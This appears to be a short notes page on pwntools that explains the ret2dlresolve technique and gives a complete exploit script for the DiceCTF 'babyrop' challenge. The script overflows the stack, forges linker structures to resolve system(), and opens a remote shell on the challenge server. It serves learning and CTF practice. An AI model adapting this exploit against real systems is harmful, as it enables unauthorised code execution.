# Python pwntools
This page contains some notes and code using Python [pwntools](https://github.com/Gallopsled/pwntools) to exploit binaries. Contents are:
- [ret2dlresolve](#ret2dlresolve)

## ret2dlresolve
The [pwntools](pwntools.md) library has a function that will automatically create a payload for *ret2dlresolve* (finding and calling any function in a dynamic library, including *libc*). It does this by fooling the linker into thinking it needs to resolve the `system()` function in the PLT. The following is a solution for DiceCTF babyrop using *ret2dlresolve*:
```
#!/usr/bin/env python3
from pwn import *

# Add the binary to use
binary = ELF('./babyrop')
context.binary = binary

# Create a payload for ret2dl for the system command
# This will trick the dynamic linker into resolving
# system() for us
d = Ret2dlresolvePayload(binary, symbol="system", args=["sh"])

# Create our rop chain
rop = ROP(binary)

# This is just for stack alignment (ret gadget)
rop.raw(0x40101a)

# Get where to write the fake structures
# to be resolved
rop.gets(d.data_addr)

# Call to dl_resolve() to resolve our system() function
rop.ret2dlresolve(d)

# Attach to the remote server
p = remote('dicec.tf', 31924)

# Send the payload to resolve system()
p.sendline(flat({72: rop.chain()}))

# Send the payload to call system
p.sendline(d.payload)

# Interact with the new shell!
p.interactive()
```